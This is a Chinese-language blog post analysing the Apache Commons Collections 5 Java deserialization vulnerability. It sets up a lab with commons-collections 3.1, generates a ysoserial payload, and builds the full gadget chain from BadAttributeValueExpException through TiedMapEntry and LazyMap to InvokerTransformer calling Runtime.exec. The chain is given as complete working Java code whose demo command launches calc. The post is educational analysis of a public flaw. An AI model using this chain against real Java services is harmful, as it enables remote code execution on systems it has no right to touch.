# Apache Commons Collections5 反序列化漏洞分析


# 前言

Apache Commons Collections的漏洞最初在2015年11月6日由FoxGlove Security安全团队的@breenmachine 在一篇长博客上阐述，危害面覆盖了大部分的Web中间件，影响十分深远。

# 影响版本

```
Apache Commons Collections <= 3.2.1，<= 4.0.0
```

# 环境搭建

使用idea创建一个maven项目，在pom.xml文件中加入commons-collections依赖。

```
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>

    <groupId>org.example</groupId>
    <artifactId>ysoserialPayload</artifactId>
    <version>1.0-SNAPSHOT</version>
    <dependencies>
        <dependency>
            <groupId>commons-collections</groupId>
            <artifactId>commons-collections</artifactId>
            <version>3.1</version>
        </dependency>
    </dependencies>

</project>
```

>在这里commons-collections组件没有3.1版本，idea无法自动引入，需要手动添加

创建一个java文件，包含有序列化和反序列化方法

```
package payload;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;

public class CommonsCollections5 {
    public static void main(String[] args) {
        deserialize();
    }

    public static void serialize(Object obj) {
        try {
            ObjectOutputStream os = new ObjectOutputStream(new FileOutputStream("test.ser"));
            os.writeObject(obj);
            os.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void deserialize() {
        try {
            ObjectInputStream is = new ObjectInputStream(new FileInputStream("test.ser"));
            is.readObject();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

}
```

# 漏洞复现

在这里使用`ysoserial`工具生成payload，然后运行我们创建的java文件达成命令执行的效果

`java -jar ysoserial-master-30099844c6-1.jar CommonsCollections5 calc > test.ser`

![1.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/0be64ae8-5c69-7989-4ec3-e1babdd1bba1.png)

# 漏洞分析

漏洞出现在`org.apache.commons.collections.functors.InvokerTransformer#transform` 

![2.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/386b4511-a9b7-8418-fe65-a604ad0934d8.png)

该类继承了`Transformer`和`Serializable`接口，然后可以看出下面使用反射方法，而其中的`this.iMethodName`、`this.iParamTypes`和`this.iArgs`变量可控，导致可以用反射去调用`Runtime.getRuntime().exec(cmd)`执行系统命令。

构造如下代码，去控制变量尝试弹出计算器

```
package payload;

import org.apache.commons.collections.functors.InvokerTransformer;

public class CommonsCollections5 {
    public static void main(String[] args){
        InvokerTransformer invokerTransformer = new InvokerTransformer(
                "exec", new Class[]{String.class}, new String[]{"calc"}
        );
        invokerTransformer.transform(Runtime.getRuntime());
    }
}
```

![3.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/0319ab36-9048-dc91-36b4-06520c3ee787.png)

我们知道在执行反序列化操作时，会自动执行`readObject`函数，如果直接序列化上面的`InvokerTransformer`对象，那么在`readObject`之后还需要主动调用`transform(Runtime.getRuntime())`，这显然是不实际的，因为无法自动创建`transform`对象，因此我们接下来需要解决两个问题：
1. 自动执行`Runtime.getRuntime()`
2. 自动执行`invokerTransformer.transform()`

其中第一个问题的解决方案在`org.apache.commons.collections.functors.ChainedTransformer#transform`中可以解决

![4.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/0fadf7dc-7671-a942-ec00-8bb4cd3f77cb.png)

该类也继承了`Transformer`和`Serializable`接口，我们可以定义一个`Transformer`数组，里面放入多个`InvokerTransformer`经过多次反射调用来实现自动执行`Runtime.getRuntime()`

```
package payload;

import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;

class CommonsCollections5 {

    public static void main(String[] args) throws Exception {
//        ((Runtime) Runtime.class.getMethod("getRuntime").invoke(null)).exec("calc");
        Transformer[] transformers = new Transformer[]{
                // 传入Runtime类
                new ConstantTransformer(Runtime.class),
                // 使用Runtime.class.getMethod()反射调用Runtime.getRuntime()
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                // invoke()调用Runtime.class.getMethod("getRuntime").invoke(null)
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                // 调用exec("calc")
                new InvokerTransformer("exec", new Class[]{String.class}, new String[]{"calc"})
        };
        ChainedTransformer chain = new ChainedTransformer(transformers);
        chain.transform(null);
    }
}
```

接下来第二个问题，解决思路为全局搜索那个类会去调用`transform()`，然后继续搜索该类中调用`transform()`的方法可以被其它的类调用，直到其被重写的`readObject()`调用。

其中在`org.apache.commons.collections.map.LazyMap#get`调用了`transform()`

![5.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/213764ab-aa13-867f-0704-88befc099b74.png)

可以构造出以下代码

```
HashMap hashMap = new HashMap();
Map map = LazyMap.decorate(hashMap, chain);
map.get("test");	//map.get() > transform()
```

接下来在`org.apache.commons.collections.keyvalue.TiedMapEntry#getValue`中调用了`LazyMap`的`get()`方法

![6.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/8c054e5e-edc2-18f4-f1e8-5c0d9de05da3.png)

其中`getValue()`调用了`map.get()`方法，而`toString()`调用了`this.getValue()`，而其中`this.key`可控

可以构造出以下代码

```
HashMap hashMap = new HashMap();
Map map = LazyMap.decorate(hashMap, chain);
// map.get("test");
TiedMapEntry key = new TiedMapEntry(map, "key");
key.toString();	// toString > getValue() > map.get()
```


接下来就应该去找哪个类会去自动触发`toString()`，而在jdk内置类中有一个`BadAttributeValueExpException`异常类，其`readObject（）`会执行`toString()`，这样整条链子就齐了

![7.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/ba0187ff-e428-8897-0891-687687945f99.png)

![8.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/c5791207-f743-442e-a8b4-a76c4d51cd60.png)

其中`System.getSecurityManager() == null`默认成立，因此`toString()`一定会触发，payload如下

```
package payload;

import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.management.BadAttributeValueExpException;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

class CommonsCollections5 {

    public static void main(String[] args) throws Exception {
//        ((Runtime) Runtime.class.getMethod("getRuntime").invoke(null)).exec("calc");
        Transformer[] transformers = new Transformer[]{
                // 传入Runtime类
                new ConstantTransformer(Runtime.class),
                // 使用Runtime.class.getMethod()反射调用Runtime.getRuntime()
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                // invoke()调用Runtime.class.getMethod("getRuntime").invoke(null)
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                // 调用exec("calc")
                new InvokerTransformer("exec", new Class[]{String.class}, new String[]{"calc"})
        };
        ChainedTransformer chain = new ChainedTransformer(transformers);
//        chain.transform(null);
        HashMap hashMap = new HashMap();
        Map map = LazyMap.decorate(hashMap, chain);
//        map.get("asd");
        TiedMapEntry key = new TiedMapEntry(map, "key");
//        key.toString();

        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
        Field field = badAttributeValueExpException.getClass().getDeclaredField("val");
        field.setAccessible(true);
        field.set(badAttributeValueExpException, key);

        byte[] bytes = Serializables.serializeToBytes(badAttributeValueExpException);
        Serializables.deserializeFromBytes(bytes);
    }
}
```

>其中我们用反射的方式构造`badAttributeValueExpException`对象，因为其构造函数会判断是否为空，如果不为空在序列化时就会执行`toString()`，那么在执行反序列化时就会导致无法触发漏洞。

ysoserial的gadget如下

```
/*
	Gadget chain:
        ObjectInputStream.readObject()
            BadAttributeValueExpException.readObject()
                TiedMapEntry.toString()
                    LazyMap.get()
                        ChainedTransformer.transform()
                            ConstantTransformer.transform()
                            InvokerTransformer.transform()
                                Method.invoke()
                                    Class.getMethod()
                            InvokerTransformer.transform()
                                Method.invoke()
                                    Runtime.getRuntime()
                            InvokerTransformer.transform()
                                Method.invoke()
                                    Runtime.exec()
	Requires:
		commons-collections
 */
```

# 参考链接

1. https://github.com/Y4er/WebLogic-Shiro-shell
2. https://www.xmanblog.net/java-deserialize-apache-commons-collections/
3. https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections5.java
